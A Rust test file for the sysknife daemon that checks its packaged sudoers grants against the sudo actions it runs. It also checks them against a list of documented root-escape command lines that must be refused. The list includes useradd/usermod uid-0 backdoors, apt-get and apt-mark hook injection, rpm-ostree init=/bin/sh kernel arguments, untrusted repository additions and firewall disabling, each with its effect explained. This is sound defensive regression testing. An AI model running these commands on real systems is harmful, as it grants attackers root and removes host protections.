//! Every `sudo`-invoking action must be authorised by a rule in
//! `packaging/sysknife-sudoers`.
//!
//! This exists because a mismatch here is invisible in unit tests and total in
//! production. `apt.rs` used the bare binary name `apt-get` while the packaged
//! grant spelled `/usr/bin/apt-get`; sudo PATH-resolves only its *primary*
//! command and matches every later token literally, so the rule never applied
//! and every mutating apt action died with "a password is required" — after
//! the operator had approved a preview promising it would run.
//!
//! Verified against the real thing (Ubuntu 24.04, sudo 1.9.15p5):
//!
//! ```text
//! $ sudo -u sysknife sudo -n env DEBIAN_FRONTEND=… NEEDRESTART_MODE=a apt-get --version
//! sudo: a password is required
//! $ sudo -u sysknife sudo -n env DEBIAN_FRONTEND=… NEEDRESTART_MODE=a /usr/bin/apt-get --version
//! apt 2.8.3 (amd64)
//! ```
//!
//! The matcher below implements the same rule sudo applies, so drift in either
//! direction — a new sudo action with no grant, or a grant edited out of step
//! with the argv — fails here instead of on a user's machine.

use sysknife_daemon::actions::{catalogue, ActionMechanism};

/// One `Cmnd_Spec` from the sudoers file, already split into tokens.
struct Grant {
    tokens: Vec<String>,
}

fn load_grants() -> Vec<Grant> {
    let path = concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../../packaging/sysknife-sudoers"
    );
    let text = std::fs::read_to_string(path)
        .unwrap_or_else(|e| panic!("cannot read the packaged sudoers file at {path}: {e}"));

    text.lines()
        .map(str::trim)
        .filter(|line| !line.starts_with('#') && !line.is_empty())
        .filter_map(|line| line.split_once("NOPASSWD:"))
        .map(|(_, cmd)| Grant {
            tokens: cmd.split_whitespace().map(str::to_string).collect(),
        })
        .filter(|g| !g.tokens.is_empty())
        .collect()
}

/// Does this grant authorise `argv`, using sudo's own matching rules?
///
/// * The first token is the command sudo executes. sudo resolves it via
///   `PATH`, so an absolute grant matches a bare argv[0] with the same
///   basename (this is why `sudo env …` matches a `/usr/bin/env` grant).
/// * Every later token is compared **literally**. No PATH resolution, no
///   canonicalisation — this is the rule that broke apt.
/// * A trailing `*` matches all remaining arguments. A grant with no argument
///   tokens at all permits any arguments.
/// * A single `""` argument permits no arguments at all (`sudoers(5)`; sudo-rs
///   0.2.13 agrees).
fn grant_allows(grant: &Grant, argv: &[String]) -> bool {
    let Some((grant_cmd, grant_args)) = grant.tokens.split_first() else {
        return false;
    };
    let Some((actual_cmd, actual_args)) = argv.split_first() else {
        return false;
    };

    let basename = |s: &str| s.rsplit('/').next().unwrap_or(s).to_string();
    if grant_cmd != actual_cmd && basename(grant_cmd) != basename(actual_cmd) {
        return false;
    }
    // A bare command grant ("/usr/bin/sh") allows any arguments.
    if grant_args.is_empty() {
        return true;
    }
    if grant_args == [r#""""#] {
        return actual_args.is_empty();
    }

    let mut actual = actual_args.iter();
    for (i, expected) in grant_args.iter().enumerate() {
        if expected == "*" {
            // Trailing wildcard swallows the rest. sudo only permits `*` as
            // the final argument, which this file relies on.
            return i == grant_args.len() - 1;
        }
        match actual.next() {
            Some(got) if got == expected => {}
            _ => return false,
        }
    }
    actual.next().is_none()
}

#[test]
fn every_sudo_action_is_authorised_by_a_packaged_grant() {
    let grants = load_grants();
    assert!(
        !grants.is_empty(),
        "parsed zero grants — the sudoers parser or file layout changed"
    );

    let mut unauthorised = Vec::new();
    let mut checked = 0;
    for (_section, specs) in catalogue() {
        for spec in specs {
            let ActionMechanism::Command { program, args } = &spec.mechanism else {
                continue;
            };
            if *program != "sudo" {
                continue;
            }
            checked += 1;
            assert!(
                !args.iter().take(1).any(|arg| matches!(
                    arg.rsplit('/').next(),
                    Some("sh" | "bash" | "dash" | "runuser")
                )),
                "{} must use bounded argv instead of a privileged shell/user launcher",
                spec.action_name
            );
            if !grants.iter().any(|g| grant_allows(g, args)) {
                unauthorised.push(format!("{}: sudo {}", spec.action_name, args.join(" ")));
            }
        }
    }

    assert!(
        checked > 50,
        "only {checked} sudo action specs were checked; the mechanism or program filter must have changed and this guard is no longer looking at anything"
    );
    assert!(
        unauthorised.is_empty(),
        "these actions invoke sudo with an argv no rule in packaging/sysknife-sudoers \
         authorises, so they will fail at runtime with \"a password is required\":\n  {}",
        unauthorised.join("\n  ")
    );
}

#[test]
fn matcher_rejects_a_bare_binary_name_against_an_absolute_argument_token() {
    // Pins the exact semantics the apt bug turned on: sudo resolves argv[0]
    // via PATH, but an argument token is only ever compared literally.
    let grant = Grant {
        tokens: "/usr/bin/env FOO=1 /usr/bin/apt-get *"
            .split_whitespace()
            .map(str::to_string)
            .collect(),
    };

    let absolute: Vec<String> = "env FOO=1 /usr/bin/apt-get update"
        .split_whitespace()
        .map(str::to_string)
        .collect();
    assert!(
        grant_allows(&grant, &absolute),
        "an absolute argument token matching the grant must be allowed"
    );

    let bare: Vec<String> = "env FOO=1 apt-get update"
        .split_whitespace()
        .map(str::to_string)
        .collect();
    assert!(
        !grant_allows(&grant, &bare),
        "a bare argument token must NOT match an absolute grant token — sudo \
         does not PATH-resolve arguments, only the primary command"
    );
}

#[test]
fn matcher_reads_empty_quotes_as_no_arguments() {
    // `aa-status ""` is granted with no arguments at all. sudo 1.9.15 and
    // sudo-rs 0.2.13 both admit `aa-status` and refuse `aa-status --json`
    // against that line; a matcher that read `""` as a literal token, or as
    // "anything", would make the grant look wider or narrower than it is.
    let grant = Grant {
        tokens: vec!["/usr/sbin/aa-status".to_string(), r#""""#.to_string()],
    };
    assert!(grant_allows(&grant, &["aa-status".to_string()]));
    assert!(!grant_allows(
        &grant,
        &["aa-status".to_string(), "--json".to_string()]
    ));
}

/// No grant may permit arbitrary arguments.
///
/// A grant with no argument tokens matches whatever sudo is handed after the
/// command, so `NOPASSWD: /usr/bin/systemctl` authorised `systemctl link
/// /path/evil.service` as surely as `systemctl restart nginx`. Sixteen
/// families were narrowed in two passes, and fifteen more were left bare on the
/// reading that their first argument was the parameter, so there was nothing
/// to anchor a grant on. That reading was wrong for all fifteen
/// (GHSA-8rx7-g2jg-5pxg): `apt-mark` takes `-o Dir::Bin::dpkg=<path>` after the
/// subcommand and runs it as root, `lvextend --config` names the `fsadm`
/// executable `-r` runs, and the shadow tools honour `-R <chroot>` even after
/// `--`. Each one now has an exact argv, a fixed prefix ending in `--` for a
/// tool that honours it, or a verb of `/usr/lib/sysknife/action-steps`, which
/// validates the whole argument list.
///
/// The original check kept a list of bare grants with a reason for each. The
/// list is empty now, and an empty allowlist is a place for the next one to
/// land quietly, so the rule is absolute.
#[test]
fn no_grant_permits_arbitrary_arguments() {
    let grants = load_grants();
    let with_arguments = grants.iter().filter(|g| g.tokens.len() > 1).count();
    assert!(
        with_arguments > 50,
        "only {with_arguments} grants carry argument tokens; the parser stopped \
         seeing them, which would make this check pass over nothing"
    );

    let bare: Vec<String> = grants
        .iter()
        .filter(|g| g.tokens.len() == 1)
        .map(|g| g.tokens[0].clone())
        .collect();
    assert!(
        bare.is_empty(),
        "these grants permit ANY arguments:\n  {}\n\
         Narrow the grant to the argv the action builds (end the fixed part in \
         `--` where the tool honours it, or use `\"\"` for no arguments), or \
         route the call through /usr/lib/sysknife/action-steps.",
        bare.join("\n  ")
    );
    // A trailing `*` on rpm-ostree takes its options as readily as an operand:
    // `kargs --append=init=/bin/sh`, `install /tmp/x.rpm`, `override replace
    // <local rpm>`. Every rpm-ostree call that takes an operand goes through
    // `action-steps rpm-ostree`; what stays granted directly is a fixed argv.
    let rpm_ostree_wildcards: Vec<String> = grants
        .iter()
        .filter(|g| {
            g.tokens[0] == "/usr/bin/rpm-ostree" && g.tokens.iter().any(|t| t.contains('*'))
        })
        .map(|g| g.tokens.join(" "))
        .collect();
    assert!(
        rpm_ostree_wildcards.is_empty(),
        "these rpm-ostree grants take any further argument:\n  {}\n\
         Route the call through /usr/lib/sysknife/action-steps rpm-ostree.",
        rpm_ostree_wildcards.join("\n  ")
    );
}

/// Every escape GHSA-j9c3-j2qr-65c4 named, run through the matcher as an argv.
///
/// The previous version of this test asserted that the `useradd`, `usermod` and
/// `systemctl` grants carried at least one argument token. They did, from
/// 0.20.0 onward, and all three escapes below still matched, because sudoers
/// matches the arguments as a single concatenated string: a trailing `*`
/// accepts further OPTIONS exactly as readily as a value, so
/// `useradd --create-home -o -u 0 -g 0 backdoor` matched a grant written as
/// `useradd --create-home *`. "The grant is narrowed" and "the escape is
/// refused" are different claims, and only the second one is the property.
///
/// sudoers has no way to say "and nothing further", so the argv these actions
/// build now goes through `/usr/lib/sysknife/action-steps`, which re-validates
/// every token. That means this file no longer grants `useradd`, `usermod` or
/// the eight unit verbs at all, and the escapes are refused for the strongest
/// possible reason: nothing authorises the binary.
///
/// The helper's own screen is what refuses `action-steps unit start
/// debug-shell.service`, which this layer does authorise by design; that half
/// is proved in tests/release/action-steps.test.sh.
const ROOT_ESCAPES: &[(&str, &str)] = &[
    (
        "/usr/sbin/useradd --create-home -o -u 0 -g 0 backdoor",
        "a second uid-0 account, which is root without a shell grant",
    ),
    (
        "/usr/sbin/useradd -o -u 0 -g 0 backdoor",
        "the same account with no leading literal to hide behind",
    ),
    (
        "/usr/sbin/usermod --lock -o -u 0 someuser",
        "makes an existing account uid 0",
    ),
    (
        "/usr/sbin/usermod -p HASH root",
        "rewrites root's password hash",
    ),
    (
        "/usr/bin/systemctl start debug-shell.service",
        "an unauthenticated root shell on tty9",
    ),
    (
        "/usr/bin/systemctl start rescue.target",
        "a root maintenance shell",
    ),
    (
        "/usr/bin/systemctl link /tmp/evil.service",
        "installs a unit file from a path the caller owns",
    ),
    (
        "/usr/bin/fail2ban-client set sshd action pwn actionban CMD",
        "a jail action whose ban command runs as root",
    ),

    // GHSA-8rx7-g2jg-5pxg item 4: the fifteen bare grants. sudo-rs refuses a
    // wildcard anywhere but the last argument, so each grant is a fixed argv,
    // a fixed prefix ending in `--` for tools that honour it, or a helper verb.
    (
        "/usr/bin/gpasswd --add x sudo",
        "root-equivalent group membership; the daemon never ran gpasswd through sudo",
    ),
    (
        "/usr/bin/gpasswd -A x sudo",
        "makes the account administrator of the sudo group",
    ),
    (
        "/usr/sbin/userdel -R /tmp/x y",
        "redirects userdel's writes into a caller-chosen root",
    ),
    (
        "/usr/sbin/userdel -- -R /tmp/x y",
        "the same: shadow-utils scans for -R before getopt, so `--` does not stop it",
    ),
    (
        "/usr/sbin/groupadd -o -g 0 rootgrp",
        "a second gid-0 group, which reads every root-group file",
    ),
    (
        "/usr/sbin/groupdel -R /tmp/x devs",
        "the shadow-utils chroot flag again",
    ),
    (
        "/usr/bin/chage -R /tmp/x -M 1 alice",
        "the shadow-utils chroot flag again",
    ),
    ("/usr/bin/chage -E 0 root", "expires the root account"),
    (
        "/usr/sbin/lvextend --config=global/fsadm_executable=/tmp/x -r -L +1G vg0/root",
        "`-r` runs the configured fsadm, so this runs /tmp/x as root",
    ),
    (
        "/usr/sbin/lvcreate --config=global/thin_check_executable=/tmp/x --type thin-pool -L 1G vg0",
        "runs a caller-chosen thin_check binary as root",
    ),
    (
        "/usr/bin/apt-mark -o Dir::Bin::dpkg=/tmp/x hold bash",
        "`hold` runs the configured dpkg, so this runs /tmp/x as root",
    ),
    (
        "/usr/bin/apt-mark hold bash -o Dir::Bin::dpkg=/tmp/x",
        "the same, with the option after the subcommand, which apt also parses",
    ),
    (
        "/usr/bin/add-apt-repository ppa:attacker/x",
        "the positional form, which also takes a raw sources.list line",
    ),
    (
        "/usr/bin/add-apt-repository -y deb [trusted=yes] http://203.0.113.7/ x main",
        "an unsigned third-party archive the next install trusts",
    ),
    (
        "/usr/bin/add-apt-repository -y -U http://203.0.113.7/",
        "an arbitrary archive URI",
    ),
    (
        "/usr/sbin/ufw default allow incoming",
        "opens every port without any of the eight ufw actions",
    ),
    (
        "/usr/sbin/ufw logging off",
        "silences the firewall's own record",
    ),
    (
        "/usr/sbin/aa-complain -d /tmp/x nginx",
        "loads AppArmor profiles from a directory the caller owns",
    ),
    (
        "/usr/sbin/aa-enforce -d /tmp/x nginx",
        "the same through the enforce verb",
    ),
    (
        "/usr/bin/canonical-livepatch disable",
        "turns off live kernel patching",
    ),
    (
        "/usr/bin/do-release-upgrade -d",
        "upgrades the host to an unreleased development series",
    ),
    // The env-wrapped apt-get grant took any arguments after `apt-get`, and
    // pinning the env prefix did nothing against apt's own options. apt now goes
    // through `action-steps apt`, which builds the argv, so no apt-get argv is
    // admitted at all. The helper's refusal of `-o`/`-c` is proved in
    // tests/release/action-steps.test.sh.
    (
        "/usr/bin/env DEBIAN_FRONTEND=noninteractive NEEDRESTART_MODE=a /usr/bin/apt-get -o APT::Update::Pre-Invoke::=/bin/sh update",
        "a pre-invoke hook runs a caller-chosen command as root",
    ),
    (
        "/usr/bin/env DEBIAN_FRONTEND=noninteractive NEEDRESTART_MODE=a /usr/bin/apt-get install -y -o Dir::Bin::dpkg=/tmp/x curl",
        "`install` runs the configured dpkg, so this runs /tmp/x as root",
    ),
    (
        "/usr/bin/env DEBIAN_FRONTEND=noninteractive NEEDRESTART_MODE=a /usr/bin/apt-get install -y curl -o Dir::Bin::dpkg=/tmp/x",
        "the same with the option after the operand, which apt also parses",
    ),
    (
        "/usr/bin/env DEBIAN_FRONTEND=noninteractive NEEDRESTART_MODE=a /usr/bin/apt-get -c /tmp/evil.conf update",
        "a config file whose hooks run as root",
    ),
    (
        "/usr/bin/env DEBIAN_FRONTEND=noninteractive NEEDRESTART_MODE=a /usr/bin/apt-get install -y linux-image-generic-",
        "a trailing `-` makes install remove the package",
    ),
    (
        "/usr/bin/apt-get -o APT::Update::Pre-Invoke::=/bin/sh update",
        "the bare binary, which the daemon never needed a grant for",
    ),
    // The `/usr/bin/rpm-ostree <subcommand> *` grants admitted rpm-ostree's own
    // options and any operand. Operands now go through `action-steps
    // rpm-ostree`, whose refusals are proved in tests/release/action-steps.test.sh.
    (
        "/usr/bin/rpm-ostree kargs --append=init=/bin/sh",
        "a root shell at the next boot, past the daemon's kargs screens",
    ),
    (
        "/usr/bin/rpm-ostree kargs --delete=lockdown=confidentiality",
        "drops a boot protection the daemon refuses to remove",
    ),
    (
        "/usr/bin/rpm-ostree kargs --editor",
        "opens an editor as root",
    ),
    (
        "/usr/bin/rpm-ostree install /tmp/x.rpm",
        "a local package whose scriptlets run as root in the next deployment",
    ),
    (
        "/usr/bin/rpm-ostree install --idempotent /tmp/x.rpm",
        "the same behind the flag the daemon sends",
    ),
    (
        "/usr/bin/rpm-ostree uninstall podman --install=/tmp/x.rpm",
        "uninstall also takes packages to install",
    ),
    (
        "/usr/bin/rpm-ostree override replace /tmp/x.rpm",
        "replaces a base package with a local one",
    ),
    (
        "/usr/bin/rpm-ostree override remove gedit --replace=/tmp/x.rpm",
        "the same through the remove subcommand",
    ),
    (
        "/usr/bin/rpm-ostree rebase ostree-unverified-image:oci:/tmp/img",
        "boots an OS image the caller put on disk",
    ),
    (
        "/usr/bin/rpm-ostree upgrade --install=/tmp/x.rpm",
        "upgrade also takes packages to install",
    ),
    (
        "/usr/bin/rpm-ostree rollback --reboot",
        "the fixed grants admit their own argv and nothing after it",
    ),
    // GHSA-8rx7-g2jg-5pxg item 5: `kill -s *` admitted every target.
    (
        "/usr/bin/kill -s KILL -1",
        "signals every process root can reach",
    ),
    (
        "/usr/bin/kill -s KILL -- -1",
        "the same with options terminated",
    ),
    ("/usr/bin/kill -s KILL 1", "kills init"),
];

/// The argv the action-timeout reaper builds. It is not a catalogue action, so
/// `every_sudo_action_is_authorised_by_a_packaged_grant` never sees it.
/// `executor::tests::root_group_kill_argv_*` pins the daemon to this shape.
const REAPER_ARGV: &str = "/usr/lib/sysknife/action-steps signal KILL -4242";

/// The reaper's argv for a timed-out rpm-ostree action, whose transaction runs
/// in rpm-ostreed's cgroup where a signal cannot reach it.
/// `executor::tests::reap_command_*` pins the daemon to this shape.
const REAPER_CANCEL_ARGV: &str = "/usr/bin/rpm-ostree cancel";

#[test]
fn no_grant_authorises_a_documented_root_escape() {
    let grants = load_grants();
    assert!(
        !grants.is_empty(),
        "parsed zero grants, so every escape below would be refused by an empty file"
    );
    // A positive control in the same test: with no grant matching anything, the
    // assertions below hold for the wrong reason.
    let allowed: Vec<String> = "/usr/lib/sysknife/action-steps unit start nginx.service"
        .split_whitespace()
        .map(str::to_string)
        .collect();
    assert!(
        grants.iter().any(|g| grant_allows(g, &allowed)),
        "the matcher refused an argv the catalogue builds, so it is refusing everything"
    );
    let reaper: Vec<String> = REAPER_ARGV.split_whitespace().map(str::to_string).collect();
    assert!(
        grants.iter().any(|g| grant_allows(g, &reaper)),
        "no grant admits the action-timeout reaper's `sudo {REAPER_ARGV}`, so a \
         timed-out root child would never be signalled"
    );

    let cancel: Vec<String> = REAPER_CANCEL_ARGV
        .split_whitespace()
        .map(str::to_string)
        .collect();
    assert!(
        grants.iter().any(|g| grant_allows(g, &cancel)),
        "no grant admits the action-timeout reaper's `sudo -n {REAPER_CANCEL_ARGV}`, \
         so a timed-out rpm-ostree transaction would never be cancelled"
    );

    let mut admitted = Vec::new();
    for (escape, why) in ROOT_ESCAPES {
        let argv: Vec<String> = escape.split_whitespace().map(str::to_string).collect();
        if let Some(g) = grants.iter().find(|g| grant_allows(g, &argv)) {
            admitted.push(format!(
                "{escape}\n    is {why}, admitted by `{}`",
                g.tokens.join(" ")
            ));
        }
    }
    assert!(
        admitted.is_empty(),
        "these grants authorise an escape the advisories say is closed:\n  {}",
        admitted.join("\n  ")
    );
}

/// The binaries that must not reappear as a direct grant, with what they buy.
///
/// Losing the grant is what closes the class; a later "narrowed" grant would
/// reopen it, and `ROOT_ESCAPES` alone would not say which change did it.
#[test]
fn the_root_shell_primitives_have_no_direct_grant() {
    let grants = load_grants();
    for (cmd, why) in [
        (
            "/usr/sbin/useradd",
            "`-o -u 0` creates a second root account",
        ),
        (
            "/usr/sbin/usermod",
            "`-o -u 0` moves an existing account to uid 0",
        ),
        (
            "/usr/bin/kill",
            "`-s KILL -1` signals every process; sudoers cannot refuse a target",
        ),
        (
            "/usr/bin/gpasswd",
            "`--add <user> sudo` is root-equivalent membership",
        ),
        (
            "/usr/sbin/userdel",
            "`-R <dir>` is honoured even after `--`",
        ),
        (
            "/usr/sbin/groupadd",
            "`-o -g 0` creates a second root group",
        ),
        (
            "/usr/sbin/groupdel",
            "`-R <dir>` is honoured even after `--`",
        ),
        ("/usr/bin/chage", "`-R <dir>` is honoured even after `--`"),
        (
            "/usr/sbin/lvextend",
            "`--config` names the executable `-r` runs as root",
        ),
        (
            "/usr/sbin/lvcreate",
            "`--config` names executables LVM runs as root",
        ),
        (
            "/usr/bin/apt-get",
            "`-o APT::Update::Pre-Invoke::=<cmd>` runs <cmd> as root",
        ),
        (
            "/usr/bin/env",
            "runs any command as root; its only grant was the apt-get prefix",
        ),
        (
            "/usr/bin/apt-mark",
            "a regular expression operand holds every package it matches; \
             `action-steps apt` passes the option that stops that",
        ),
    ] {
        let matching: Vec<&Grant> = grants.iter().filter(|g| g.tokens[0] == cmd).collect();
        assert!(
            matching.is_empty(),
            "{cmd} is granted directly again ({why}). sudoers cannot forbid the \
             options that follow a wildcard; route it through \
             /usr/lib/sysknife/action-steps, which validates its whole argv."
        );
    }
    // These keep direct grants, and each one must stay argument-constrained.
    for cmd in [
        "/usr/bin/systemctl",
        "/usr/bin/hostnamectl",
        "/usr/bin/timedatectl",
        "/usr/bin/localectl",
        "/usr/bin/resolvectl",
    ] {
        let matching: Vec<&Grant> = grants.iter().filter(|g| g.tokens[0] == cmd).collect();
        assert!(
            !matching.is_empty(),
            "{cmd} has no grant at all; this check would otherwise pass over nothing"
        );
        for g in matching {
            assert!(
                g.tokens.len() > 1,
                "{cmd} is granted with no argument constraint again. A bare grant here \
                 authorises every invocation of it, including the ones the daemon's own \
                 validators exist to refuse."
            );
        }
    }
}
